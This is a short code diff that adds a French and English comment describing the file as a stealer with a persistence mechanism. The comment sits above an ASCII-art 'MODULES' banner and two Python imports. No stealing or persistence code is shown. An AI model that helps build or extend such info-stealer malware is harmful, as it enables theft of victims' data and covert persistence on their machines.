@@ -1,10 +1,13 @@
+# Ceci est un stealer avec un mécanisme de persistance intégré.
+# This is a stealer with an integrated persistence mechanism.
+
 # .___  ___.   ______    _______   __    __   __       _______     _______.
 # |   \/   |  /  __  \  |       \ |  |  |  | |  |     |   ____|   /       |
 # |  \  /  | |  |  |  | |  .--.  ||  |  |  | |  |     |  |__     |   (----`
 # |  |\/|  | |  |  |  | |  |  |  ||  |  |  | |  |     |   __|     \   \    
 # |  |  |  | |  `--'  | |  '--'  ||  `--'  | |  `----.|  |____.----)   |   
 # |__|  |__|  \______/  |_______/  \______/  |_______||_______|_______/    
-                                                                         
+
 
 import os
 import io
